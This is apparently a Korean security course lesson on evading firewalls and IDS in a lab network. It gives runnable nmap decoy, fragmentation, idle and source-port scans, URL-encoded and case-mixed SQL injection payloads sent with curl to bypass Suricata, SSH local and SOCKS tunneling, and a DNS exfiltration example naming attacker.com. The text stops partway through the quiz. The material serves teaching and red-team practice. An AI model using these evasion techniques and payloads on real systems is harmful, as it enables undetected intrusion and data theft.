# Week 03: 네트워크 우회 기법 — 방화벽 우회, IDS 회피, 프래그먼트 공격

## 학습 목표
- 네트워크 보안 장비(방화벽, IDS/IPS, WAF)의 탐지 원리를 심층적으로 이해한다
- nmap의 방화벽 우회 기법(Decoy, Fragmentation, Idle Scan 등)을 실행하고 효과를 검증할 수 있다
- IP 프래그먼테이션을 활용한 IDS 회피 공격 원리를 이해하고 구현할 수 있다
- Suricata/Snort IDS 규칙의 탐지 로직을 분석하고 우회 방법을 설계할 수 있다
- nftables 방화벽 규칙을 분석하고 우회 가능한 약점을 식별할 수 있다
- 터널링(SSH, DNS, ICMP)을 이용한 방화벽 우회 기법을 실행할 수 있다
- MITRE ATT&CK Defense Evasion 전술의 네트워크 관련 기법을 매핑할 수 있다

## 전제 조건
- TCP/IP 프로토콜 스택(3계층, 4계층)의 동작 원리를 이해하고 있어야 한다
- nmap의 기본 스캔 기법(SYN, Connect, UDP)을 수행할 수 있어야 한다
- 방화벽(nftables/iptables) 규칙의 기본 구조를 읽을 수 있어야 한다
- Wireshark/tcpdump로 패킷을 캡처하고 분석할 수 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (공격 출발점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS (nftables + Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 (Wazuh) | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | 보안 장비 탐지 원리 + 우회 이론 | 강의 |
| 0:35-1:10 | nmap 방화벽 우회 기법 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | IP 프래그먼트 + IDS 회피 실습 | 실습 |
| 1:55-2:30 | 터널링 기법 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 종합 우회 시나리오 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 보안 장비 탐지 원리와 우회 이론 (35분)

## 1.1 네트워크 보안 장비 계층 구조

```
+------------------------------------------------------------------+
|                    네트워크 보안 계층                               |
+------------------------------------------------------------------+
| L7 WAF          | BunkerWeb, ModSecurity    | HTTP 요청/응답 분석 |
| L4-L7 IDS/IPS   | Suricata, Snort           | 패킷 페이로드 분석  |
| L3-L4 방화벽     | nftables, iptables        | IP/포트 기반 필터링 |
| L2 스위치 보안   | 802.1X, MAC 필터링        | MAC 주소 기반       |
+------------------------------------------------------------------+
```

### 각 보안 장비의 탐지 방식

| 장비 | 탐지 방식 | 강점 | 약점 |
|------|----------|------|------|
| **nftables** (L3-L4) | 규칙 매칭 (IP, 포트, 프로토콜) | 빠름, 정확함 | 페이로드 무시 |
| **Suricata** (L4-L7) | 시그니처 + 프로토콜 파싱 | 심층 분석 | 암호화 트래픽 무력 |
| **BunkerWeb** (L7) | HTTP 규칙, 봇 탐지, 속도 제한 | 웹 특화 | 비-HTTP 무력 |

## 1.2 방화벽(nftables) 탐지 로직

nftables는 **패킷의 헤더 정보**를 기반으로 허용/차단을 결정한다.

```
패킷 → [소스IP] [목적지IP] [프로토콜] [소스포트] [목적지포트] [플래그]
           ↓         ↓          ↓          ↓           ↓          ↓
        규칙 매칭: ip saddr / ip daddr / tcp dport / ct state 등
           ↓
     accept / drop / reject
```

### nftables 규칙 구조

```
table inet filter {
    chain input {
        type filter hook input priority 0;
        ct state established,related accept    # 기존 연결 허용
        ct state invalid drop                   # 비정상 패킷 드롭
        iif lo accept                           # 루프백 허용
        tcp dport 22 accept                     # SSH 허용
        tcp dport 80 accept                     # HTTP 허용
        tcp dport 443 accept                    # HTTPS 허용
        counter drop                            # 나머지 차단
    }
}
```

### 방화벽 우회 가능한 약점

| 약점 | 우회 방법 | ATT&CK |
|------|----------|--------|
| 허용된 포트(80, 443) | 해당 포트로 C2 통신 | T1571 |
| 아웃바운드 미필터링 | 리버스 셸 | T1095 |
| DNS(53) 허용 | DNS 터널링 | T1071.004 |
| ICMP 허용 | ICMP 터널링 | T1095 |
| IPv6 미필터링 | IPv6 공격 | T1205 |
| 프래그먼트 처리 | 프래그먼트 공격 | T1027.013 |

## 1.3 IDS/IPS(Suricata) 탐지 로직

Suricata는 **시그니처(규칙) 기반 + 프로토콜 분석**으로 악성 트래픽을 탐지한다.

### Suricata 규칙 구조

```
action  protocol  src_ip  src_port  ->  dst_ip  dst_port  (options)

예시:
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ET SCAN Nmap SYN Scan";
    flags:S;
    flow:stateless;
    threshold: type both, track by_src, count 30, seconds 60;
    sid:2000001; rev:1;
)
```

### IDS 회피 기법 분류

| 기법 | 원리 | 효과 |
|------|------|------|
| 프래그먼테이션 | 페이로드를 여러 패킷에 분산 | 시그니처 매칭 실패 |
| 인코딩 | URL 인코딩, Base64, 이중 인코딩 | 페이로드 변형 |
| 암호화 | TLS/SSL 사용 | 페이로드 불가시 |
| 프로토콜 위반 | 비표준 패킷 구성 | 파싱 오류 유발 |
| 타이밍 | 저속 공격, 분산 | 임계값 미만 유지 |
| 다형성 | 페이로드 매번 변경 | 정적 시그니처 우회 |

## 1.4 MITRE ATT&CK: Defense Evasion (네트워크)

| 기법 ID | 기법 이름 | 설명 | 이번 주 실습 |
|---------|---------|------|:---:|
| T1205 | Traffic Signaling | 포트 노킹, WoL | △ |
| T1205.001 | Port Knocking | 특정 순서 포트 접속 | △ |
| T1572 | Protocol Tunneling | SSH, DNS 터널링 | ✓ |
| T1571 | Non-Standard Port | 비표준 포트 사용 | ✓ |
| T1001 | Data Obfuscation | 트래픽 난독화 | ✓ |
| T1001.001 | Junk Data | 더미 데이터 삽입 | ✓ |
| T1001.003 | Protocol Impersonation | 프로토콜 위장 | ✓ |
| T1090 | Proxy | 프록시 경유 | △ |
| T1027.013 | Encrypted/Encoded File | 프래그먼트/인코딩 | ✓ |

---

# Part 2: nmap 방화벽 우회 기법 실습 (35분)

## 2.1 Decoy 스캔

Decoy 스캔은 **여러 가짜 IP에서 동시에 스캔하는 것처럼 위장**하여 실제 공격자 IP를 숨기는 기법이다.

```
실제 공격자: 10.20.30.201

Decoy 패킷 (방어자가 보는 것):
  10.20.30.201 → 10.20.30.80 (실제)
  192.168.1.100 → 10.20.30.80 (가짜)
  172.16.0.50 → 10.20.30.80 (가짜)
  10.0.0.1 → 10.20.30.80 (가짜)

방어자: "어느 것이 진짜인지 구분 불가"
```

## 실습 2.1: Decoy 스캔

> **실습 목적**: Decoy 스캔으로 스캔 출발지를 위장하여 방어자의 IP 추적을 방해하는 기법을 실습한다
>
> **배우는 것**: nmap -D 옵션을 사용한 Decoy 스캔의 원리와 방어자 관점에서의 탐지를 배운다
>
> **결과 해석**: Suricata 로그에 여러 소스 IP의 스캔 알림이 나타나면 Decoy가 성공한 것이다
>
> **실전 활용**: 실제 APT는 봇넷이나 VPN을 이용하여 유사한 효과를 달성한다
>
> **명령어 해설**: -D RND:5는 5개의 랜덤 IP를 Decoy로 사용하며, ME는 자신의 실제 IP를 포함한다
>
> **트러블슈팅**: Decoy IP가 비현실적이면(인터넷 상 존재하지 않는 IP) 방화벽에서 드롭될 수 있다

```bash
# 일반 스캔 (비교 기준)
echo "=== 일반 SYN 스캔 ==="
echo 1 | sudo -S nmap -sS -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== Decoy 스캔 (5개 가짜 IP 사용) ==="
# -D RND:5 = 5개 랜덤 Decoy IP 생성
echo 1 | sudo -S nmap -sS -D RND:5 -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== Decoy 스캔 (특정 IP 지정) ==="
# 실제 내부 네트워크 IP를 Decoy로 사용 (더 현실적)
echo 1 | sudo -S nmap -sS -D 10.20.30.1,10.20.30.100,10.20.30.50,ME -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== IDS 로그 확인 (Decoy 효과 검증) ==="
sleep 2
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -10 /var/log/suricata/fast.log 2>/dev/null | grep -i 'scan' || echo 'No scan alerts'"
```

## 2.2 프래그먼테이션 스캔

IP 프래그먼테이션은 패킷을 **작은 조각으로 분할**하여 전송하는 것이다. IDS는 조각을 재조립해야 시그니처를 매칭할 수 있다.

```
정상 패킷:
[IP Header][TCP Header][Payload: GET /admin HTTP/1.1]

프래그먼트된 패킷:
[IP Header][Fragment 1: TCP Hea]
[IP Header][Fragment 2: der][Pa]
[IP Header][Fragment 3: yload: ]
[IP Header][Fragment 4: GET /ad]
[IP Header][Fragment 5: min HTT]
[IP Header][Fragment 6: P/1.1]

IDS가 재조립에 실패하면 → 시그니처 매칭 불가 → 탐지 회피
```

## 실습 2.2: 프래그먼테이션 스캔

> **실습 목적**: IP 프래그먼테이션을 이용한 IDS 회피 스캔을 실습한다
>
> **배우는 것**: nmap -f 옵션의 프래그먼트 크기와 IDS 탐지 우회 효과를 이해한다
>
> **결과 해석**: 프래그먼트 스캔이 일반 스캔과 동일한 결과를 반환하면서 IDS 알림이 줄면 성공이다
>
> **실전 활용**: 현대 IDS(Suricata)는 재조립 기능이 있어 단순 프래그먼트만으로는 회피 어렵다
>
> **명령어 해설**: -f는 8바이트 프래그먼트, -ff는 16바이트, --mtu로 크기 지정 가능하다
>
> **트러블슈팅**: 프래그먼트 패킷이 드롭되면 방화벽이 프래그먼트를 차단하는 것이다

```bash
# 일반 스캔 (비교 기준)
echo "=== 일반 SYN 스캔 ==="
echo 1 | sudo -S nmap -sS -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 프래그먼트 스캔 (-f: 8바이트 조각) ==="
echo 1 | sudo -S nmap -sS -f -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 더 작은 프래그먼트 (-ff: 16바이트 → 실제론 더 세분화) ==="
echo 1 | sudo -S nmap -sS -ff -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 커스텀 MTU (24바이트) ==="
echo 1 | sudo -S nmap -sS --mtu 24 -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== tcpdump으로 프래그먼트 확인 ==="
# 프래그먼트된 패킷 관찰 (3초 캡처)
echo 1 | sudo -S timeout 5 tcpdump -i any -c 20 'host 10.20.30.80 and (ip[6:2] & 0x1fff != 0)' 2>/dev/null || echo "프래그먼트 패킷 미캡처 (정상일 수 있음)"
```

## 실습 2.3: Idle/Zombie 스캔 원리

> **실습 목적**: 자신의 IP를 전혀 노출하지 않는 Idle(Zombie) 스캔의 원리를 이해한다
>
> **배우는 것**: IP ID 증분을 이용한 간접 스캔의 이론과 실행 조건을 배운다
>
> **결과 해석**: Zombie 호스트의 IP ID가 증가하면 대상 포트가 열려있는 것이다
>
> **실전 활용**: 완전히 은닉된 포트 스캔이 필요한 극도로 은밀한 정찰에 사용한다
>
> **명령어 해설**: -sI는 Idle 스캔이며, Zombie 호스트의 IP를 지정한다
>
> **트러블슈팅**: Zombie 호스트가 적합하지 않으면 "Idle scan zombie is not idle" 에러가 발생한다

```bash
# Idle Scan 원리 설명
cat << 'IDLE_SCAN'
=== Idle (Zombie) Scan 원리 ===

전제: Zombie 호스트는 IP ID를 순차적으로 증가시켜야 한다

1단계: Zombie의 현재 IP ID 확인
   공격자 → Zombie: SYN/ACK
   Zombie → 공격자: RST (IP ID = 1000)

2단계: 위조 패킷 전송
   공격자 → 대상: SYN (소스IP = Zombie IP)

3단계: 대상 응답에 따른 분기
   [포트 열림]
   대상 → Zombie: SYN/ACK → Zombie → 대상: RST (IP ID 증가!)
   [포트 닫힘]
   대상 → Zombie: RST → Zombie: 아무것도 안 함 (IP ID 미증가)

4단계: Zombie IP ID 재확인
   공격자 → Zombie: SYN/ACK
   Zombie → 공격자: RST (IP ID = 1001 또는 1002)

   IP ID 1001 → 포트 닫힘 (1회 증가: 우리 확인 패킷만)
   IP ID 1002 → 포트 열림 (2회 증가: 대상 응답 + 확인)
IDLE_SCAN

echo ""
echo "=== Idle Scan 실행 (Zombie 적합성 확인) ==="
# 내부 네트워크에서 Zombie 후보 확인
echo 1 | sudo -S nmap -O -v 10.20.30.100 2>/dev/null | grep -i "IP ID\|ipid\|incremental" || echo "IP ID 패턴 확인 불가"

# Idle Scan 시도 (Zombie: siem 서버)
echo 1 | sudo -S nmap -sI 10.20.30.100 -p 22,80 10.20.30.80 2>/dev/null || echo "Idle Scan 실행 불가 (Zombie가 적합하지 않을 수 있음)"
```

## 실습 2.4: 소스 포트 조작

> **실습 목적**: 방화벽이 신뢰하는 소스 포트(53, 80, 443)를 사용하여 스캔을 우회한다
>
> **배우는 것**: 방화벽 규칙의 소스 포트 기반 필터링 약점과 우회 방법을 배운다
>
> **결과 해석**: 일반 스캔에서 filtered인 포트가 소스 포트 조작으로 open이 되면 우회 성공이다
>
> **실전 활용**: 오래된 방화벽 규칙에서 DNS(53), HTTP(80) 소스 포트를 허용하는 경우가 있다
>
> **명령어 해설**: --source-port 또는 -g 옵션으로 소스 포트를 지정한다
>
> **트러블슈팅**: 소스 포트 사용에 권한이 필요하면 sudo로 실행한다

```bash
# 소스 포트 53 (DNS) 사용
echo "=== 소스 포트 53 (DNS) 스캔 ==="
echo 1 | sudo -S nmap -sS --source-port 53 -p 22,80,443 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"

echo ""
echo "=== 소스 포트 80 (HTTP) 스캔 ==="
echo 1 | sudo -S nmap -sS -g 80 -p 22,80,443 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"

echo ""
echo "=== 소스 포트 443 (HTTPS) 스캔 ==="
echo 1 | sudo -S nmap -sS -g 443 -p 22,3000,8002 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"

echo ""
echo "[설명] 방화벽이 소스포트 53/80/443을 신뢰하면 필터링된 포트에도 접근 가능"
```

---

# Part 3: IDS 회피 + 프래그먼트 고급 (35분)

## 3.1 Suricata 규칙 분석과 우회

Suricata 규칙의 구조를 이해하면 어떤 패턴이 탐지되는지 알 수 있고, 우회 방법을 설계할 수 있다.

### 규칙 분석 예시

```
# 규칙 1: Nmap SYN 스캔 탐지
alert tcp any any -> $HOME_NET any (
    msg:"ET SCAN Potential Nmap SYN Scan";
    flags:S,12;                           # SYN 플래그만 설정
    flow:stateless;
    threshold: type both, track by_src, count 50, seconds 5;
    sid:2000001;
)

우회 방법:
1. 임계값(50/5초) 미만으로 저속 스캔
2. SYN 외 다른 플래그 조합 사용 (FIN, ACK)
3. 여러 소스 IP에서 분산 스캔
```

```
# 규칙 2: SQL Injection 탐지
alert http any any -> $HOME_NET any (
    msg:"ET WEB_SERVER SQL Injection";
    content:"UNION"; nocase;
    content:"SELECT"; nocase;
    sid:2000002;
)

우회 방법:
1. 대소문자 혼합: UnIoN SeLeCt
2. 인코딩: %55NION %53ELECT
3. 주석 삽입: UN/**/ION SE/**/LECT
4. 동의어: UNION ALL SELECT
```

## 실습 3.1: Suricata 규칙 확인 및 우회 테스트

> **실습 목적**: 실습 환경의 Suricata 규칙을 확인하고, 규칙을 우회하는 기법을 테스트한다
>
> **배우는 것**: Suricata 규칙 구조 분석, content 매칭 우회, 임계값 우회를 배운다
>
> **결과 해석**: 우회 기법 적용 후 fast.log에 알림이 발생하지 않으면 우회 성공이다
>
> **실전 활용**: Red Team은 타겟 IDS 규칙을 분석하여 탐지되지 않는 페이로드를 설계한다
>
> **명령어 해설**: suricata 규칙 파일에서 특정 패턴을 검색하여 탐지 로직을 파악한다
>
> **트러블슈팅**: 규칙 파일 위치는 /etc/suricata/rules/ 또는 /var/lib/suricata/rules/이다

```bash
# Suricata 규칙 확인
echo "=== Suricata 활성 규칙 확인 ==="
sshpass -p1 ssh secu@10.20.30.1 \
  "ls /etc/suricata/rules/ 2>/dev/null || ls /var/lib/suricata/rules/ 2>/dev/null | head -10" 2>/dev/null || echo "규칙 디렉토리 접근 불가"

echo ""
echo "=== 스캔 탐지 규칙 검색 ==="
sshpass -p1 ssh secu@10.20.30.1 \
  "grep -r 'SCAN\|scan' /etc/suricata/rules/ 2>/dev/null | head -5 || echo 'rules 디렉토리 확인 불가'"

echo ""
echo "=== SQL Injection 탐지 규칙 검색 ==="
sshpass -p1 ssh secu@10.20.30.1 \
  "grep -r 'SQL\|sql.*inject\|UNION.*SELECT' /etc/suricata/rules/ 2>/dev/null | head -5 || echo '규칙 확인 불가'"

echo ""
echo "=== 현재 Suricata 알림 (최근 10건) ==="
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -10 /var/log/suricata/fast.log 2>/dev/null || echo 'fast.log 없음'"
```

## 실습 3.2: 인코딩 기반 IDS 우회

> **실습 목적**: URL 인코딩, 이중 인코딩, 대소문자 혼합 등으로 IDS 시그니처를 우회한다
>
> **배우는 것**: HTTP 요청의 다양한 인코딩 방식과 IDS/WAF의 디코딩 처리 차이를 배운다
>
> **결과 해석**: 인코딩된 요청이 원본과 동일한 응답을 받으면서 IDS 알림이 없으면 우회 성공이다
>
> **실전 활용**: WAF 우회, IDS 회피에서 인코딩 기법은 가장 기본적인 우회 수단이다
>
> **명령어 해설**: %xx 형식은 URL 인코딩이며, IDS가 디코딩하지 않으면 패턴 매칭에 실패한다
>
> **트러블슈팅**: 이중 인코딩이 동작하지 않으면 서버/WAF가 자동 디코딩하는 것이다

```bash
# SQL Injection IDS 우회 테스트
echo "=== 1. 원본 SQLi (탐지 예상) ==="
curl -s "http://10.20.30.80:3000/rest/products/search?q=' UNION SELECT 1--" 2>/dev/null | head -3

echo ""
echo "=== 2. URL 인코딩 우회 ==="
# ' = %27, UNION = %55NION
curl -s "http://10.20.30.80:3000/rest/products/search?q=%27%20%55NION%20%53ELECT%201--" 2>/dev/null | head -3

echo ""
echo "=== 3. 이중 인코딩 우회 ==="
# ' = %2527 (% = %25, 27 유지)
curl -s "http://10.20.30.80:3000/rest/products/search?q=%2527%20UNION%20SELECT%201--" 2>/dev/null | head -3

echo ""
echo "=== 4. 대소문자 혼합 우회 ==="
curl -s "http://10.20.30.80:3000/rest/products/search?q=' UnIoN SeLeCt 1--" 2>/dev/null | head -3

echo ""
echo "=== 5. 주석 삽입 우회 ==="
curl -s "http://10.20.30.80:3000/rest/products/search?q=' UN/**/ION SE/**/LECT 1--" 2>/dev/null | head -3

echo ""
echo "=== IDS 알림 확인 ==="
sleep 2
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -5 /var/log/suricata/fast.log 2>/dev/null | grep -i 'sql\|injection' || echo 'SQL 관련 알림 없음'"
```

## 실습 3.3: 타이밍 기반 IDS 회피

> **실습 목적**: IDS의 시간 기반 임계값을 회피하는 저속 공격(Low and Slow) 기법을 실습한다
>
> **배우는 것**: IDS 임계값(threshold) 설정의 원리와 이를 우회하는 타이밍 조절 기법을 배운다
>
> **결과 해석**: 저속 스캔이 IDS 알림 없이 완료되면 임계값 우회 성공이다
>
> **실전 활용**: APT는 수일~수주에 걸쳐 정찰하여 모든 시간 기반 탐지를 회피한다
>
> **명령어 해설**: --scan-delay는 패킷 간 지연 시간, -T0~T5는 타이밍 프로필이다
>
> **트러블슈팅**: 시간이 너무 오래 걸리면 --max-retries 0으로 재시도를 줄인다

```bash
# 타이밍별 스캔 비교
echo "=== T4 (공격적) 스캔 ==="
START=$(date +%s)
echo 1 | sudo -S nmap -sS -T4 -p 22,80 10.20.30.80 2>/dev/null | grep "open"
END=$(date +%s)
echo "소요시간: $((END-START))초"

sleep 2

echo ""
echo "=== 저속 스캔 (--scan-delay 10s) ==="
START=$(date +%s)
echo 1 | sudo -S nmap -sS --scan-delay 10s --max-retries 0 -p 22,80 10.20.30.80 2>/dev/null | grep "open"
END=$(date +%s)
echo "소요시간: $((END-START))초"

echo ""
echo "=== IDS 알림 비교 ==="
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -10 /var/log/suricata/fast.log 2>/dev/null | grep -c 'SCAN' || echo '0'" 2>/dev/null
echo "건의 스캔 알림 발생"
```

---

# Part 4: 터널링 기법과 종합 우회 시나리오 (35분)

## 4.1 SSH 터널링

SSH 터널링은 **SSH 암호화 채널을 통해 다른 트래픽을 전달**하는 기법이다. 방화벽이 SSH(22)를 허용하면 사실상 모든 트래픽을 통과시킬 수 있다.

### SSH 터널링 유형

| 유형 | 명령 | 용도 |
|------|------|------|
| **로컬 포워딩** (-L) | `ssh -L 8080:target:80 jump` | 로컬→원격 서비스 접근 |
| **리모트 포워딩** (-R) | `ssh -R 9090:localhost:80 attacker` | 원격→로컬 서비스 노출 |
| **동적 포워딩** (-D) | `ssh -D 1080 jump` | SOCKS 프록시 |

```
[로컬 포워딩]
공격자:8080 ----SSH 암호화----> 점프서버 ---평문---> 대상:80
              방화벽 통과!

[동적 포워딩 (SOCKS)]
공격자:1080(SOCKS) ---SSH--- 점프서버 ----> 내부서버A:3306
                                     ----> 내부서버B:5432
                                     ----> 어디든 접근 가능
```

## 실습 4.1: SSH 로컬 포트 포워딩

> **실습 목적**: SSH 터널을 통해 방화벽 뒤의 서비스에 접근하는 기법을 실습한다
>
> **배우는 것**: SSH -L 옵션으로 로컬 포트를 원격 서비스에 매핑하는 방법을 배운다
>
> **결과 해석**: 로컬 포트로 접근했을 때 원격 서비스의 응답이 오면 터널링 성공이다
>
> **실전 활용**: 침투 후 내부 네트워크의 서비스에 접근할 때 SSH 피봇팅에 활용한다
>
> **명령어 해설**: -L 8888:10.20.30.80:3000은 로컬 8888포트를 원격 3000에 연결한다
>
> **트러블슈팅**: 포트 충돌 시 다른 로컬 포트를 사용하고, -N으로 셸 미실행 옵션을 추가한다

```bash
# SSH 로컬 포트 포워딩
echo "=== SSH 터널 설정 ==="
# web 서버의 Juice Shop(3000)을 로컬 8888로 포워딩
sshpass -p1 ssh -f -N -L 8888:10.20.30.80:3000 web@10.20.30.80 2>/dev/null
sleep 2

# 터널을 통해 접근
echo "=== 터널 통해 Juice Shop 접근 ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:8888/ 2>/dev/null

# 터널 정리
kill $(pgrep -f "ssh.*8888:10.20.30.80:3000" 2>/dev/null) 2>/dev/null
echo "[SSH 터널 정리 완료]"
```

## 실습 4.2: SSH 동적 포워딩 (SOCKS 프록시)

> **실습 목적**: SOCKS 프록시를 통해 점프 서버 뒤의 모든 서비스에 접근하는 기법을 실습한다
>
> **배우는 것**: SSH -D 옵션으로 SOCKS 프록시를 구성하고, proxychains으로 도구를 연결하는 방법을 배운다
>
> **결과 해석**: proxychains을 통한 nmap/curl이 정상 동작하면 SOCKS 터널이 성공한 것이다
>
> **실전 활용**: 측면 이동 시 피봇 호스트를 통해 전체 내부 네트워크를 스캔하는 데 활용한다
>
> **명령어 해설**: -D 1080은 로컬에 SOCKS5 프록시를 생성하며, proxychains이 이를 사용한다
>
> **트러블슈팅**: proxychains 미설치 시 apt install proxychains4, 설정은 /etc/proxychains4.conf

```bash
# SSH 동적 포워딩 (SOCKS 프록시)
echo "=== SOCKS 프록시 설정 ==="
sshpass -p1 ssh -f -N -D 1080 web@10.20.30.80 2>/dev/null
sleep 2

# proxychains 설정 확인
if which proxychains4 >/dev/null 2>&1 || which proxychains >/dev/null 2>&1; then
  echo "proxychains 설치됨"
  echo "=== SOCKS 프록시 통한 접근 ==="
  # proxychains4 curl http://10.20.30.100:8002/ 2>/dev/null || echo "proxychains 실행 실패"
  echo "[교육] proxychains4 curl http://내부서버/ 형태로 사용"
else
  echo "proxychains 미설치 - apt install proxychains4"
fi

# curl로 직접 SOCKS 프록시 사용
echo ""
echo "=== curl --socks5 사용 ==="
curl -s --socks5 localhost:1080 -o /dev/null -w "HTTP Status: %{http_code}\n" http://10.20.30.80:3000/ 2>/dev/null || echo "SOCKS 프록시 연결 실패"

# 정리
kill $(pgrep -f "ssh.*-D 1080" 2>/dev/null) 2>/dev/null
echo "[SOCKS 프록시 정리 완료]"
```

## 4.2 DNS 터널링 개요

DNS 터널링은 DNS 프로토콜 내부에 데이터를 인코딩하여 전달하는 기법이다. DNS(53)는 거의 모든 네트워크에서 허용되므로 강력한 우회 수단이다.

```
[DNS 터널링 구조]
클라이언트 → DNS 재귀 서버 → 공격자 DNS 서버
  (데이터를 서브도메인에 인코딩)
  쿼리: aGVsbG8gd29ybGQ.tunnel.attacker.com
  응답: TXT "cmVzcG9uc2U=" (base64 인코딩 데이터)
```

### DNS 터널링 도구

| 도구 | 특징 | 속도 |
|------|------|------|
| iodine | 가장 안정적, IP over DNS | 중간 |
| dnscat2 | 암호화 지원, 다기능 | 느림 |
| dns2tcp | 단순, TCP over DNS | 빠름 |
| DNSExfiltrator | 데이터 유출 특화 | 느림 |

## 실습 4.3: 종합 우회 시나리오

> **실습 목적**: 학습한 모든 우회 기법을 결합하여 다층 보안을 우회하는 종합 시나리오를 실행한다
>
> **배우는 것**: 실제 APT가 여러 기법을 조합하는 방식과, 방어 측의 탐지 포인트를 종합적으로 배운다
>
> **결과 해석**: 각 우회 기법의 성공/실패를 기록하고 방어 로그와 대조하여 분석한다
>
> **실전 활용**: 모의해킹에서 보안 장비를 우회하여 목표에 도달하는 전체 플로우에 활용한다
>
> **명령어 해설**: 복수의 nmap 옵션과 curl 인코딩을 조합한 종합 공격 명령이다
>
> **트러블슈팅**: 특정 기법이 실패하면 해당 기법만 분리하여 원인을 분석한다

```bash
echo "============================================================"
echo "         종합 우회 시나리오 — 다층 보안 통과                   "
echo "============================================================"

echo ""
echo "[단계 1] 저속 + 프래그먼트 + Decoy 결합 스캔"
echo 1 | sudo -S nmap -sS -f -D RND:3 --scan-delay 3s -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "[단계 2] 소스 포트 53(DNS) 사용 + 서비스 감지"
echo 1 | sudo -S nmap -sV --source-port 53 -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "[단계 3] 인코딩된 웹 공격 (WAF/IDS 우회)"
# URL 인코딩 + 대소문자 혼합
curl -s -o /dev/null -w "HTTP %{http_code}" \
  "http://10.20.30.80:3000/rest/products/search?q=%27%20UnIoN%20SeLeCt%201--" 2>/dev/null
echo ""

echo ""
echo "[단계 4] SSH 터널 통한 내부 접근"
sshpass -p1 ssh -f -N -L 9999:localhost:8002 web@10.20.30.80 2>/dev/null
sleep 1
curl -s -o /dev/null -w "SubAgent via tunnel: HTTP %{http_code}\n" http://localhost:9999/ 2>/dev/null
kill $(pgrep -f "ssh.*9999:localhost:8002" 2>/dev/null) 2>/dev/null

echo ""
echo "[단계 5] 방어 로그 확인"
sleep 2
sshpass -p1 ssh secu@10.20.30.1 \
  "echo 'Suricata 알림:' && tail -5 /var/log/suricata/fast.log 2>/dev/null || echo 'N/A'" 2>/dev/null

sshpass -p1 ssh siem@10.20.30.100 \
  "echo 'Wazuh 알림:' && tail -3 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c '
import sys,json
for line in sys.stdin:
    try:
        d=json.loads(line)
        print(f\"  [{d.get(\"rule\",{}).get(\"level\",\"?\")}] {d.get(\"rule\",{}).get(\"description\",\"?\")}\")
    except: pass' 2>/dev/null || echo '  N/A'" 2>/dev/null

echo ""
echo "============================================================"
echo "  결과 분석: 어떤 기법이 탐지되었고 어떤 기법이 우회되었는지   "
echo "  방어 로그와 대조하여 분석하라                                "
echo "============================================================"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | Decoy 스캔 실행 | nmap -D | 정상 결과 + 다수 소스IP |
| 2 | 프래그먼트 스캔 | nmap -f | 정상 결과 반환 |
| 3 | Idle 스캔 원리 | 구두 설명 | IP ID 기반 매커니즘 설명 |
| 4 | 소스 포트 조작 | nmap -g 53 | 추가 포트 발견 가능 |
| 5 | Suricata 규칙 분석 | 규칙 파일 확인 | content 매칭 로직 이해 |
| 6 | 인코딩 우회 | curl + URL encoding | IDS 미탐지 |
| 7 | 저속 스캔 | --scan-delay | IDS 임계값 미달 |
| 8 | SSH 로컬 포워딩 | ssh -L | 터널 통한 접근 성공 |
| 9 | SOCKS 프록시 | ssh -D | 프록시 통한 접근 성공 |
| 10 | 종합 시나리오 | 전체 실행 | 5단계 완료 |

---

## 자가 점검 퀴즈

**Q1.** nmap의 Decoy 스캔(-D)이 방어자를 혼란시키는 원리는?

<details><summary>정답</summary>
Decoy 스캔은 실제 스캔 패킷과 함께 가짜 소스 IP에서 온 것처럼 보이는 위조 패킷을 동시에 전송한다. 방어자는 여러 IP에서 동시에 스캔이 오는 것으로 보이므로 실제 공격자 IP를 특정하기 어렵다.
</details>

**Q2.** IP 프래그먼테이션으로 IDS를 우회할 수 있는 이유는?

<details><summary>정답</summary>
IDS의 시그니처 매칭은 완전한 패킷의 페이로드를 대상으로 한다. 패킷이 여러 프래그먼트로 분할되면 각 프래그먼트에는 시그니처의 일부만 포함되어 매칭에 실패한다. IDS가 프래그먼트를 재조립하지 못하면 탐지를 회피할 수 있다.
</details>

**Q3.** Suricata 규칙에서 `threshold: type both, track by_src, count 50, seconds 5`의 의미는?

<details><summary>정답</summary>
